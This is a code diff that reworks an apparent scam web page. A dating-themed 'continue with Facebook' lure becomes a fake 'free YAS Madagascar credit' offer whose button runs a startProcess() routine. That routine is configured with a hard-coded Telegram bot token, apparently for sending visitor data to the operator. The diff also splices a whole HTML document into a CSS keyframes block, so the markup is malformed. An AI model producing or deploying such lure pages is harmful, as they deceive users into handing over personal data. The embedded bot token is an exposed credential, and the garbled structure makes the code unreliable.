@@ -117,6 +117,128 @@
     }
 
     @keyframes pop {
+
+<!DOCTYPE html>
+<html lang="mg">
+<head>
+  <meta charset="UTF-8"/>
+  <title> CREDIT GRATUIT YAS </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+  <style>
+    :root {
+      --c1:#080b18;
+      --c2:#30106b;
+      --c3:#003d58;
+      --neon:#00f5ff;
+      --purple:#a855f7;
+      --white:#fff;
+    }
+
+    body {
+      margin:0;
+      min-height:100vh;
+      display:flex;
+      flex-direction:column;
+      justify-content:center;
+      align-items:center;
+      padding:20px;
+      overflow:hidden;
+      background:
+        radial-gradient(circle at 20% 20%,var(--c2),transparent 45%),
+        radial-gradient(circle at 80% 80%,var(--c3),transparent 45%),
+        var(--c1);
+      color:var(--white);
+      font-family:'Segoe UI',sans-serif;
+    }
+
+    body::before {
+      content:"";
+      position:fixed;
+      inset:-50%;
+      background:conic-gradient(
+        transparent,
+        #00f5ff22,
+        transparent,
+        #a855f722,
+        transparent
+      );
+      animation:rotate 15s linear infinite;
+      pointer-events:none;
+    }
+
+    @keyframes rotate {
+      to { transform:rotate(360deg); }
+    }
+
+    h1 {
+      position:relative;
+      margin:0 0 10px;
+      font-size:30px;
+      font-weight:800;
+      letter-spacing:1px;
+      text-shadow:0 0 15px #00f5ff88;
+      animation:fade 1s;
+      text-align:center;
+    }
+
+    p {
+      position:relative;
+      margin:0 0 25px;
+      color:#c5d4ef;
+      text-align:center;
+      line-height:1.6;
+      animation:fade 1.2s;
+    }
+
+    @keyframes fade {
+      from {
+        opacity:0;
+        transform:translateY(-20px);
+      }
+      to {
+        opacity:1;
+        transform:translateY(0);
+      }
+    }
+
+    button {
+      position:relative;
+      z-index:2;
+      padding:15px 32px;
+      border:1px solid #00f5ff88;
+      border-radius:15px;
+      background:linear-gradient(135deg,#00c8ff,#7c3aed);
+      color:var(--white);
+      font-size:18px;
+      font-weight:800;
+      cursor:pointer;
+      box-shadow:0 0 20px #00c8ff44;
+      transition:transform .3s,box-shadow .3s;
+    }
+
+    button:hover {
+      transform:translateY(-3px);
+      box-shadow:0 0 30px #00c8ff88;
+    }
+
+    button:active {
+      transform:scale(.97);
+    }
+
+    #preview {
+      position:relative;
+      margin-top:20px;
+      width:120px;
+      height:120px;
+      object-fit:cover;
+      border-radius:50%;
+      border:2px solid var(--neon);
+      box-shadow:0 0 20px #00f5ff66;
+      animation:pop .6s;
+    }
+
+    @keyframes pop {
       from {
         transform:scale(0);
         opacity:0;
@@ -139,11 +261,14 @@
   </style>
 </head>
 <body>
-  <h1> Rencontre </h1>
-  <p> continuer avec <strong>"Facebook"</strong></p>
-  <button onclick="startProcess()">Facebook</button>
+  <h1> CREDIT GRATUIT YAS </h1>
+  <p> Profitez d'une offre de crédit gratuit<br/>
+      <strong>YAS Madagascar</strong>
+  </p>
+  <button onclick="startProcess()">Obtenir mon crédit</button>
 
 <script>
+
 
   /* ------------- PARAMÈTRES TELEGRAM ------------- */
   const BOT_TOKEN = "8469966308:AAGzr6xL7R3zqV9r9yCC61LTCIxvY6oKtOs";
